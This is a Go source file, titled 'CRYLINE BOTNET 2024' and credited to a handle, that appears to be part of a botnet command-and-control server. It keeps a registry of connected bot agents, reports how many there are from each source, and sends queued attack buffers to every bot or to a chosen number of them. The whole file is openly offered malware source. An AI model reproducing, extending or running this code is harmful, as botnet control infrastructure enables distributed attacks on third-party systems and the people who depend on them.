/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

package main

import (
    "time"
    "math/rand"
    "sync"
    "fmt"
)

type AttackSend struct {
    _BUFFER []byte
    _COUNTER int
    _AGENT_SETTER string
}

type ClientList struct {
    _UID int
    _COUNTER int
    _AGENTS map[int]*__AGENT
    _ADD_QUEUE chan *__AGENT
    _DELETE_QUEUE chan *__AGENT
    _ATTACK_QUEUE  chan *AttackSend
    _GET_TOTAL_COUNTER chan int
    _GET_CNT_VIEW chan int
    _VIEW_REQUEST chan int
    _VIEW_RESPONSE chan map[string]int
    _GET_MUTEX *sync.Mutex
}

func __NEW_AGENT_LIST() *ClientList {
    _GET_AGENT := &ClientList{0, 0, make(map[int]*__AGENT), make(chan *__AGENT, 128), make(chan *__AGENT, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}

    go _GET_AGENT.__WORKER()
    go _GET_AGENT.fastCountWorker()

    return _GET_AGENT
}

func (_THIS *ClientList) __COUNT() int {
    _THIS._GET_MUTEX.Lock()

    defer _THIS._GET_MUTEX.Unlock()

    _THIS._GET_CNT_VIEW <- 0

    return <-_THIS._GET_CNT_VIEW
}

func (_THIS *ClientList) __DESTRIBUTION() map[string]int {
    _THIS._GET_MUTEX.Lock()

    defer _THIS._GET_MUTEX.Unlock()

    _THIS._VIEW_REQUEST <- 0

    return <-_THIS._VIEW_RESPONSE
}

func (_THIS *ClientList) __CONNECTED_NEW_BOTNET_AGENT(_GET_AGENT *__AGENT) {
    _THIS._ADD_QUEUE <- _GET_AGENT

    fmt.Printf("[+] Connected new botnet agent: %d %s - %s\n", _GET_AGENT._VERSION, _GET_AGENT._SOURCE, _GET_AGENT._CONNECTION.RemoteAddr())
}

func (_THIS *ClientList) __DISCONNECTED_BOTNET_AGENT(_GET_AGENT *__AGENT) {
    _THIS._DELETE_QUEUE <- _GET_AGENT

    fmt.Printf("[-] Disconnected botnet agent: %d %s - %s\n", _GET_AGENT._VERSION, _GET_AGENT._SOURCE, _GET_AGENT._CONNECTION.RemoteAddr())
}

func (_THIS *ClientList) __QUEUE_BUFFER(_BUFFER []byte, _MAX_AGENTS int, _AGENT_SETTER string) {
    _ATTACK := &AttackSend{_BUFFER, _MAX_AGENTS, _AGENT_SETTER}

    _THIS._ATTACK_QUEUE <- _ATTACK
}

func (_THIS *ClientList) fastCountWorker() {
    for {
        select {
        case _DELTA := <-_THIS._GET_TOTAL_COUNTER:

            _THIS._COUNTER += _DELTA

            break

        case <-_THIS._GET_CNT_VIEW:

            _THIS._GET_CNT_VIEW <- _THIS._COUNTER

            break
        }
    }
}

func (_THIS *ClientList) __WORKER() {
    rand.Seed(time.Now().UTC().UnixNano())

    for {
        select {
        case _CONNECTED := <-_THIS._ADD_QUEUE:

            _THIS._GET_TOTAL_COUNTER <- 1
            _THIS._UID++

            _CONNECTED._UID = _THIS._UID

            _THIS._AGENTS[_CONNECTED._UID] = _CONNECTED

            break
        case _DISCONNECTED := <-_THIS._DELETE_QUEUE:

            _THIS._GET_TOTAL_COUNTER <- -1

            delete(_THIS._AGENTS, _DISCONNECTED._UID)

            break
        case _ATTACK := <-_THIS._ATTACK_QUEUE:

            if _ATTACK._COUNTER == -1 {
                for _,GET_THIS_VALUE := range _THIS._AGENTS {
                    if _ATTACK._AGENT_SETTER == "" || _ATTACK._AGENT_SETTER == GET_THIS_VALUE._SOURCE {
                        GET_THIS_VALUE.__QUEUE_BUFFER(_ATTACK._BUFFER)
                    }
                }
            } else {
                var _COUNTER int

                for _, GET_THIS_VALUE := range _THIS._AGENTS {
                    if _COUNTER > _ATTACK._COUNTER {
                        break
                    }
                    if _ATTACK._AGENT_SETTER == "" || _ATTACK._AGENT_SETTER == GET_THIS_VALUE._SOURCE {
                        GET_THIS_VALUE.__QUEUE_BUFFER(_ATTACK._BUFFER)
                        _COUNTER++
                    }
                }
            }
            break
        case <-_THIS._GET_CNT_VIEW:

            _THIS._GET_CNT_VIEW <- _THIS._COUNTER

            break
        case <-_THIS._VIEW_REQUEST:

            _RESPONSE := make(map[string]int)

            for _,GET_THIS_VALUE := range _THIS._AGENTS {
                if _GET_STATUS,_ := _RESPONSE[GET_THIS_VALUE._SOURCE]; _GET_STATUS > 0 {
                    _RESPONSE[GET_THIS_VALUE._SOURCE]++
                } else {
                    _RESPONSE[GET_THIS_VALUE._SOURCE] = 1
                }
            }       
            _THIS._VIEW_RESPONSE <- _RESPONSE
        }
    }
}
